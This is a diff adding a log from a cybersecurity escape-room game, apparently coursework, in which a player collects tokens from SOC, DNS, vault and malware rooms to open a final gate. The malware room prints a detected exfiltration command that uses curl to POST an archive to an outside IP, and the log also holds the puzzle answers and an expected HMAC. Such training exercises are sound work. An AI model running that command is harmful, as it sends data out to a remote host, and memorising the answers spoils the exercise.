@@ -1,0 +1,57 @@
+05/11/25 19:32:47 - Welcome to the escape room game
+05/11/25 19:32:47 - 
+    ___________                                    __________                                                             
+    \_   _____/ ______ ____ _____  ______   ____   \______   \ ____   ____   _____                                        
+     |    __)_ /  ___// ___\\__  \ \____ \_/ __ \   |       _//  _ \ /  _ \ /     \                                       
+     |        \\___ \\  \___ / __ \|  |_> >  ___/   |    |   (  <_> |  <_> )  Y Y  \
+    /_______  /____  >\___  >____  /   __/ \___  >  |____|_  /\____/ \____/|__|_|  /                                      
+            \/     \/     \/     \/|__|        \/          \/                    \/                                       
+        
+05/11/25 19:32:47 - Enjoy the escape room!
+05/11/25 19:32:47 - Type quit to quit
+05/11/25 19:32:47 - Type hint for assistance
+05/11/25 19:32:47 - User called move soc
+05/11/25 19:32:47 - You have entered into CurrentRoom.SOC
+05/11/25 19:32:47 - User called inspect auth.log
+05/11/25 19:32:47 - SOC: TOKEN[KEYPAD]=21048
+05/11/25 19:32:47 - SOC: EVIDENCE[KEYPAD].TOP24=203.0.113.0/24
+05/11/25 19:32:47 - SOC: EVIDENCE[KEYPAD].COUNT=48
+05/11/25 19:32:47 - SOC: EVIDENCE[KEYPAD].SAMPLE=2025-08-09T12:01:09Z lab1 sshd[3219]: Failed password for deploy from 203.0.113.225 port 56197 protocol 2
+05/11/25 19:32:47 - SOC: EVIDENCE[KEYPAD].MALFORMED_SKIPPED=3
+05/11/25 19:32:47 - User called move dns
+05/11/25 19:32:47 - You have entered into CurrentRoom.DNS
+05/11/25 19:32:47 - User called inspect dns.cfg
+05/11/25 19:32:47 - [DNSRoom] starting decode
+05/11/25 19:32:47 - [Room DNS] Decoding hints...
+05/11/25 19:32:47 - Decoded line: "Signals converge in the switch if you read between lines"
+05/11/25 19:32:47 - Token formed: lines
+05/11/25 19:32:47 - DNS: TOKEN[DNS]=lines
+05/11/25 19:32:47 - DNS: EVIDENCE[DNS].KEY=hint4
+05/11/25 19:32:47 - DNS: EVIDENCE[DNS].DECODED_LINE=Signals converge in the switch if you read between lines
+05/11/25 19:32:47 - User called move vault
+05/11/25 19:32:47 - You have entered into CurrentRoom.VAULT
+05/11/25 19:32:47 - User called inspect vault_dump.txt
+05/11/25 19:32:47 - The values 
+SAFE{14-12-26}
+ are valid
+05/11/25 19:32:47 - The results of vault are: {'\nSAFE{14-12-26}\n': ('14', '12', '26')}
+05/11/25 19:32:47 - Vault: TOKEN[SAFE]=14-12-26
+05/11/25 19:32:47 - Vault: EVIDENCE[SAFE].MATCH=SAFE{14-12-26}
+05/11/25 19:32:47 - Vault: EVIDENCE[SAFE].CHECK=14+12=26
+05/11/25 19:32:47 - Returning token: 14-12-26
+05/11/25 19:32:47 - User called move malware
+05/11/25 19:32:47 - You have entered into CurrentRoom.MALWARE
+05/11/25 19:32:47 - User called inspect proc_tree.jsonl
+05/11/25 19:32:47 - [MalwareRoom] Starting traversal
+05/11/25 19:32:47 - [Room MALWARE] Found exfil path: [193->196->197->201]
+05/11/25 19:32:47 - [Room MALWARE] Matched command: "sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"
+05/11/25 19:32:47 - Malware: TOKEN[PID]=201
+05/11/25 19:32:47 - Malware: EVIDENCE[PID].PATH=[193->196->197->201]
+05/11/25 19:32:47 - Malware: EVIDENCE[PID].CMD="sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"
+05/11/25 19:32:47 - User called move gate
+05/11/25 19:32:47 - You have entered into CurrentRoom.FINAL_GATE
+05/11/25 19:32:47 - User called use final_gate
+05/11/25 19:32:47 - Final gate was opened with: FINAL_GATE=PENDING
+MSG=msc-group-03|21048-14-12-26-lines-201
+EXPECTED_HMAC=51be28900f8b2f5201908793f7734ea63d15ad43963b5e07ed48048efe71adee
+05/11/25 19:32:47 - Thank you for playing
